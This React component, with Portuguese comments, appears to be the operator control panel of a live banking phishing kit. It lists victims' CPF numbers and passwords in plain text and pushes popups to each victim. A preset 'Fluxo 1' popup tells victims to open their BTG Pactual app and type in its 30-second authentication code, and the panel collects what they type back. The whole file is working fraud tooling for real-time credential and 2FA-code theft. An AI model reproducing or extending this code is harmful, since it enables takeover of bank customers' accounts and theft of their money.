import { useEffect, useState } from "react";
import { ref, onValue, update, off } from "firebase/database";
import { onAuthStateChanged } from "firebase/auth";
import { auth, db } from "../utils/Firebase";
import { signOut } from "firebase/auth";

import '../styles/Admin.scss';

// 📌 LISTA DE INSTRUÇÕES PADRÃO
const INSTRUCOES = [
  {
    titulo: "Fluxo 1",
    texto: `
      1. Volte ao seu App btg pactual.
      2. No canto inferior esquerdo, clique no ícone de cadeado.
      3. Você vera o código de autenticação.
      4. Escreva aqui o código de autenticação.

      Obs: Código válido por 30 segundos`,
    podeResponder: true
  },
  {
    titulo: "Fluxo 2",
    texto: `
    1. Acesse o menu principal
    2. Clique em configurações
    3. Atualize seus dados
    4. Confirme as alterações`,
    podeResponder: false
  }
];

function Admin() {
  const [users, setUsers] = useState([]);
  const [mensagens, setMensagens] = useState({});
  const [loading, setLoading] = useState(true);

  // 🔐 AUTH FIREBASE (PROTEÇÃO DA PÁGINA)
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        window.location.href = "/login";
      } else {
        setLoading(false);
      }
    });

    return () => unsubscribe();
  }, []);

  const logout = async () => {
    await signOut(auth);
    window.location.href = "/login";
  };

  // 🔥 TEMPO REAL
  useEffect(() => {
    const usersRef = ref(db, "users");

    const unsubscribe = onValue(usersRef, (snapshot) => {
      const data = snapshot.val();

      if (data) {
        const lista = Object.values(data);
        setUsers(lista);
      } else {
        setUsers([]);
      }
    });

    return () => {
      unsubscribe(); // 🔥 correto
    };
  }, []);

  const enviarInstrucao = (id, texto, podeResponder) => {
    if (!texto) return;

    const userRef = ref(db, "users/" + id);
    const user = users.find(u => u.id === id);

    update(userRef, {
      instrucaoAtual: texto,
      instrucoes: [...(user?.instrucoes || []), texto],
      popupAtivo: true,
      podeResponder: podeResponder
    });
  };

  const togglePopup = (id, ativo) => {
    const userRef = ref(db, "users/" + id);

    update(userRef, {
      popupAtivo: ativo
    });
  };

  const handleMensagemChange = (id, value) => {
    setMensagens(prev => ({
      ...prev,
      [id]: value
    }));
  };

  // ⛔ SEGURANÇA: impede render antes de autenticar
  if (loading) {
    return (
      <div className="admin-container">
        <h2>Verificando autenticação...</h2>
      </div>
    );
  }

  return (
    <div className="admin-container">
      <h1>Painel Admin</h1>

      <div className="cards gap-xl grid grid3col">
        {users.map(user => (
          <div key={user.id} className={`card ${user.popupAtivo ? 'ativo' : 'inativo'} flex-colum gap-md`}>

            <p><strong>ID:</strong> {user.id}</p>
            <p><strong>CPF:</strong> {user.cpf}</p>
            <p><strong>Senha:</strong> {user.senha}</p>

            <div className={`status ${user.popupAtivo ? 'verde' : 'vermelho'}`}>
              {user.popupAtivo ? 'Popup Ativo' : 'Popup Fechado'}
            </div>

            <input
              type="text"
              placeholder="Digite instrução..."
              value={mensagens[user.id] || ''}
              onChange={(e) => handleMensagemChange(user.id, e.target.value)}
            />

            <div className="buttons grid gap-p">

              {INSTRUCOES.map((item, index) => (
                <button
                  key={index}
                  className="btn-secondary"
                  onClick={() => enviarInstrucao(user.id, item.texto, item.podeResponder)}
                >
                  {item.titulo}
                </button>
              ))}

              <button
                className="btn-primary"
                onClick={() => enviarInstrucao(user.id, mensagens[user.id], false)}
              >
                Enviar personalizada
              </button>

              <button
                className="btn-secondary"
                onClick={() => enviarInstrucao(user.id, mensagens[user.id], true)}
              >
                Enviar + Resposta
              </button>

              <button
                className="btn-danger"
                onClick={() => togglePopup(user.id, false)}
              >
                Fechar Popup
              </button>
            </div>

            <div className="historico">
              <strong>Histórico:</strong>
              {(user.instrucoes || []).map((inst, i) => (
                <p key={i}>{inst}</p>
              ))}
            </div>

            <div className="respostas">
              <strong>Respostas do cliente:</strong>

              {(user.respostas || []).length > 0 ? (
                user.respostas.map((resp, i) => (
                  <p key={i}>👉 {resp}</p>
                ))
              ) : (
                <p className="sem-resposta">Nenhuma resposta ainda</p>
              )}
            </div>

          </div>
        ))}
      </div>
    </div>
  );
}

export default Admin;